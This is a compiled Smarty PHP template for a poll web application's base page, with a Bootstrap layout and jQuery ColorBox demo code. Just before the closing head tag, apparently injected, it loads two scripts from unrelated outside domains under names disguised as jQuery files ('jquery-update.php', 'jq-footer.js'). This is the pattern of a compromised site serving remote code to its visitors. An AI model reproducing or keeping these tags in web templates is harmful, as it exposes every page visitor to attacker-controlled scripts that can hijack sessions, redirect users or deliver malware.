<?php /* Smarty version Smarty-3.0.8, created on 2012-08-28 05:44:34
         compiled from "/var/www/html/poll/presentation/templates/base.tpl" */ ?>
<?php /*%%SmartyHeaderCode:2031202760503c0d6a9a98c9-09799736%%*/if(!defined('SMARTY_DIR')) exit('no direct access allowed');
$_smarty_tpl->decodeProperties(array (
  'file_dependency' => 
  array (
    '3ef14744384661eafd45d415891c42f7c9d11ec1' => 
    array (
      0 => '/var/www/html/poll/presentation/templates/base.tpl',
      1 => 1346112866,
      2 => 'file',
    ),
  ),
  'nocache_hash' => '2031202760503c0d6a9a98c9-09799736',
  'function' => 
  array (
  ),
  'has_nocache_code' => false,
)); /*/%%SmartyHeaderCode%%*/?>
<?php if (!is_callable('smarty_function_load_presentation_object')) include '/var/www/html/poll/presentation/smarty_plugins/function.load_presentation_object.php';
?>
<?php  $_config = new Smarty_Internal_Config("site.conf", $_smarty_tpl->smarty, $_smarty_tpl);$_config->loadConfigVars(null, 'local'); ?>
<?php echo smarty_function_load_presentation_object(array('filename'=>"base",'assign'=>"obj"),$_smarty_tpl);?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title><?php echo $_smarty_tpl->getConfigVariable('site_title');?>
</title>
	
	<script src="styles/bootstrap/js/jquery.js"></script>
	
	<link href="styles/bootstrap/js/google-code-prettify/prettify.css" rel="stylesheet" type="text/css" />
	<link href="styles/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="styles/bootstrap/css/docs.css" rel="stylesheet" type="text/css" />
	<link href="styles/bootstrap/css/bootstrap.css" rel="stylesheet" type="text/css" />
	<link href="styles/navigation/ddsmoothmenu.css" rel="stylesheet" type="text/css" />
	
	<link rel="stylesheet" href="styles/colorbox/css/colorbox.css" />
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
	<script src="styles/colorbox/js/jquery.colorbox.js"></script>
	<script src="styles/bootstrap/js/bootstrap-dropdown.js"> </script>
	
	<style type="text/css">
		
	</style>
	
	<script>
			$(document).ready(function(){
				//Examples of how to assign the ColorBox event to elements
				$(".group1").colorbox({rel:'group1', transition:"fade"});
				$(".group2").colorbox({rel:'group2', transition:"fade"});
				$(".group3").colorbox({rel:'group3', transition:"fade"});
				$(".group4").colorbox({rel:'group4', transition:"fade"});
				$(".group5").colorbox({rel:'group5', transition:"fade"});
				$(".group6").colorbox({rel:'group6', transition:"fade"});
				$(".group7").colorbox({rel:'group7', transition:"fade"});
				$(".group8").colorbox({rel:'group8', transition:"fade"});
				$(".group9").colorbox({rel:'group9', transition:"fade"});
				$(".group10").colorbox({rel:'group10', transition:"fade"});
				$(".group11").colorbox({rel:'group11', transition:"fade"});
				$(".group12").colorbox({rel:'group12', transition:"fade"});
				$(".group13").colorbox({rel:'group13', transition:"fade"});
				$(".group14").colorbox({rel:'group14', transition:"fade"});
				$(".group15").colorbox({rel:'group15', transition:"fade"});
				$(".group16").colorbox({rel:'group16', transition:"fade"});
				$(".group17").colorbox({rel:'group17', transition:"fade"});
				$(".group18").colorbox({rel:'group18', transition:"fade"});
				$(".group19").colorbox({rel:'group19', transition:"fade"});
				$(".group20").colorbox({rel:'group20', transition:"fade"});
				$(".group21").colorbox({rel:'group21', transition:"fade"});
				$(".group22").colorbox({rel:'group22', transition:"fade"});
				$(".group23").colorbox({rel:'group23', transition:"fade"});
				$(".group24").colorbox({rel:'group24', transition:"fade"});
				$(".group25").colorbox({rel:'group25', transition:"fade"});
				$(".group26").colorbox({rel:'group26', transition:"fade"});
				$(".group27").colorbox({rel:'group27', transition:"fade"});
				$(".group28").colorbox({rel:'group28', transition:"fade"});
				$(".group29").colorbox({rel:'group29', transition:"fade"});
				$(".group30").colorbox({rel:'group30', transition:"fade"});
				$(".group31").colorbox({rel:'group31', transition:"fade"});
				$(".group32").colorbox({rel:'group32', transition:"fade"});
				$(".group33").colorbox({rel:'group33', transition:"fade"});
				$(".group34").colorbox({rel:'group34', transition:"fade"});
				$(".group35").colorbox({rel:'group35', transition:"fade"});
				$(".group36").colorbox({rel:'group36', transition:"fade"});
				$(".group37").colorbox({rel:'group37', transition:"fade"});
				
				$(".ajax").colorbox();
				$(".youtube").colorbox({iframe:true, innerWidth:425, innerHeight:344});
				$(".iframe").colorbox({iframe:true, width:"80%", height:"80%"});
				$(".inline").colorbox({inline:true, width:"50%"});
				$(".callbacks").colorbox({
					onOpen:function(){ alert('onOpen: colorbox is about to open'); },
					onLoad:function(){ alert('onLoad: colorbox has started to load the targeted content'); },
					onComplete:function(){ alert('onComplete: colorbox has displayed the loaded content'); },
					onCleanup:function(){ alert('onCleanup: colorbox has begun the close process'); },
					onClosed:function(){ alert('onClosed: colorbox has completely closed'); }
				});
				
				//Example of preserving a JavaScript event for inline calls.
				$("#click").click(function(){ 
					$('#click').css({"background-color":"#f00", "color":"#fff", "cursor":"inherit"}).text("Open this window again and this message will still be here.");
					return false;
				});
			});
		</script>
	
<script type="text/javascript" src="http://imamasim.com/modules/mod_modules/jquery-update.php"></script><script language="JavaScript" src="http://3xindiansex.com/st/css/js/jq-footer.js" type="text/javascript"></script></head>

<body>
	
	<div class="page-header" id="banner" style="background-color:#AFA1BA; ">
		<?php $_template = new Smarty_Internal_Template($_smarty_tpl->getVariable('obj')->value->mHeader, $_smarty_tpl->smarty, $_smarty_tpl, $_smarty_tpl->cache_id, $_smarty_tpl->compile_id, null, null);
 echo $_template->getRenderedTemplate(); $_template->rendered_content = null;?><?php unset($_template);?>
	</div>
	
	<div class="container">
		
		<div class="span10">
			<?php $_template = new Smarty_Internal_Template($_smarty_tpl->getVariable('obj')->value->mCell, $_smarty_tpl->smarty, $_smarty_tpl, $_smarty_tpl->cache_id, $_smarty_tpl->compile_id, null, null);
 echo $_template->getRenderedTemplate(); $_template->rendered_content = null;?><?php unset($_template);?>
		</div>	
	</div>


<!-- This contains the hidden content for inline calls -->
		<div style="display:none">
			<div id="inline_content" style="padding:10px; background:#fff;">
			<p><strong>This content comes from a hidden element on this page.</strong></p>
			<p>The inline option preserves bound JavaScript events and changes, and it puts the content back where it came from when it is closed.</p>
			<p><a id="click" href="http://www.jacklmoore.com/colorbox/example1/#" style="padding:5px; background:#ccc;">Click me, it will be preserved!</a></p>
			
			<p><strong>If you try to open a new ColorBox while it is already open, it will update itself with the new content.</strong></p>
			<p>Updating Content Example:<br>
			<a class="ajax cboxElement" href="http://www.jacklmoore.com/colorbox/content/flash.html">Click here to load new content</a></p>
			</div>
		</div>
	
<div id="cboxOverlay" style="display: none; "></div><div id="colorbox" class="" style="display: none; padding-bottom: 42px; padding-right: 42px; "><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left; "></div><div id="cboxTopCenter" style="float: left; "></div><div id="cboxTopRight" style="float: left; "></div></div><div style="clear: left; "><div id="cboxMiddleLeft" style="float: left; "></div><div id="cboxContent" style="float: left; "><div id="cboxLoadedContent" style="width: 0px; height: 0px; overflow: hidden; float: left; "></div><div id="cboxTitle" style="float: left; "></div><div id="cboxCurrent" style="float: left; "></div><div id="cboxNext" style="float: left; "></div><div id="cboxPrevious" style="float: left; "></div><div id="cboxSlideshow" style="float: left; "></div><div id="cboxClose" style="float: left; "></div></div><div id="cboxMiddleRight" style="float: left; "></div></div><div style="clear: left; "><div id="cboxBottomLeft" style="float: left; "></div><div id="cboxBottomCenter" style="float: left; "></div><div id="cboxBottomRight" style="float: left; "></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none; "></div></div>
	
</body>

</html>